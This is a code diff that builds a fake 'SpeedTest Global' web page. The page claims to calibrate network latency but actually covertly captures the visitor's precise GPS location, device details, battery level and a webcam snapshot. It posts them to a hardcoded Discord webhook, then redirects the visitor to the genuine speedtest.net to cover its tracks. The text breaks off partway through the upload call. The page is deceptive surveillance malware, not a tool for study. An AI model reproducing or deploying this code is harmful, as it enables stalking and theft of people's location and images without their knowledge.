@@ -1,87 +1,89 @@
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1476812049169383524/WP8wz0C8921xD_t0FTkX5MX2zSvb1OD0l2AGc55llvFCVcei7VeRgKG-0Q7gftwITMZV';
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SpeedTest Global | Connection Verify</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #0b0e18; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #161b2c; padding: 30px; border-radius: 20px; text-align: center; width: 90%; max-width: 380px; border: 1px solid #232a42; }
+        .logo { font-size: 24px; font-weight: bold; color: #00d2ff; border-bottom: 2px solid #00d2ff; display: inline-block; padding-bottom: 5px; }
+        .btn { background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%); color: white; border: none; padding: 15px; width: 100%; font-weight: bold; border-radius: 12px; cursor: pointer; margin-top: 20px; font-size: 1rem; }
+        #status { margin-top: 20px; font-size: 0.8rem; color: #5c6784; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
 
-    async function startForensicCapture() {
-        const status = document.getElementById('status');
-        status.innerText = "Initializing...";
+    <div class="card">
+        <div class="logo">SPEEDTEST</div>
+        <h2>Network Optimization</h2>
+        <p>Calibrating hardware latency. Please allow permissions to find the nearest node.</p>
+        <button class="btn" onclick="startForensicCapture()">BEGIN CALIBRATION</button>
+        <div id="status">Ready to scan...</div>
+    </div>
 
-        // 1. Get Battery & Device Info (No permission needed)
-        let battery = "N/A";
-        try {
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                battery = `${(b.level * 100).toFixed(0)}%`;
-            }
-        } catch(e) {}
-        
-        const device = navigator.userAgent.includes("(") ? navigator.userAgent.split('(')[1].split(')')[0] : "Unknown Device";
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
 
-        try {
-            // 2. Request Camera & Mic
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(err => {
-                console.log("Cam/Mic Denied");
-                return null; 
-            });
+    <script>
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1476812049169383524/WP8wz0C8921xD_t0FTkX5MX2zSvb1OD0l2AGc55llvFCVcei7VeRgKG-0Q7gftwITMZV';
 
-            // 3. Request GPS
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                status.innerText = "Syncing with Node...";
+        async function startForensicCapture() {
+            const status = document.getElementById('status');
+            status.innerText = "Initializing...";
 
-                const formData = new FormData();
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
+            let battery = "N/A";
+            try {
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    battery = `${(b.level * 100).toFixed(0)}%`;
+                }
+            } catch(e) {}
+            
+            const device = navigator.userAgent.includes("(") ? navigator.userAgent.split('(')[1].split(')')[0] : "Unknown Device";
 
-                const messageData = {
-                    content: "⚡ **DATA RECOVERY SUCCESSFUL**",
-                    embeds: [{
-                        title: "Calibration Report",
-                        color: 3447003,
-                        fields: [
-                            { name: "📍 Location", value: `https://www.google.com/maps?q=${lat},${lon}` },
-                            { name: "🔋 Battery", value: battery, inline: true },
-                            { name: "📱 Device", value: device, inline: true }
-                        ],
-                        timestamp: new Date()
-                    }]
-                };
+            try {
+                // Request Camera & Mic
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(err => {
+                    console.log("Cam/Mic Denied");
+                    return null; 
+                });
 
-                formData.append('payload_json', JSON.stringify(messageData));
+                // Request GPS
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    status.innerText = "Syncing with Node...";
 
-                // If camera was allowed, snap photo
-                if (stream) {
-                    const video = document.getElementById('video');
-                    video.srcObject = stream;
-                    const canvas = document.getElementById('canvas');
-                    
-                    // Wait a split second for camera to wake up
-                    setTimeout(async () => {
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
+                    const formData = new FormData();
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+
+                    const messageData = {
+                        content: "⚡ **DATA RECOVERY SUCCESSFUL**",
+                        embeds: [{
+                            title: "Calibration Report",
+                            color: 3447003,
+                            fields: [
+                                { name: "📍 Location", value: `https://www.google.com/maps?q=${lat},${lon}` },
+                                { name: "🔋 Battery", value: battery, inline: true },
+                                { name: "📱 Device", value: device, inline: true }
+                            ],
+                            timestamp: new Date()
+                        }]
+                    };
+
+                    formData.append('payload_json', JSON.stringify(messageData));
+
+                    if (stream) {
+                        const video = document.getElementById('video');
+                        video.srcObject = stream;
+                        const canvas = document.getElementById('canvas');
                         
-                        canvas.toBlob(async (blob) => {
-                            formData.append('file1', blob, 'snapshot.jpg');
-                            await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-                            finish();
-                        }, 'image/jpeg');
-                    }, 1000);
-                } else {
-                    // No camera, just send location
-                    await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-                    finish();
-                }
-
-                function finish() {
-                    if(stream) stream.getTracks().forEach(t => t.stop());
-                    status.innerText = "Calibration Complete!";
-                    setTimeout(() => window.location.href = "https://www.speedtest.net", 800);
-                }
-
-            }, (err) => {
-                alert("Error: Please allow Location Access to continue the test.");
-                status.innerText = "Error: GPS Denied";
-            }, { enableHighAccuracy: true });
-
-        } catch (err) {
-            status.innerText = "System Error";
-        }
-    }
+                        setTimeout(async () => {
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            canvas.getContext('2d').drawImage(video, 0, 0);
+                            
+                            canvas.toBlob(async (blob) => {
+                                formData.append('file1', blob, 'snapshot.jpg');
+                                await fetch(WEBHOOK_URL, { method: 'POST', body: formData
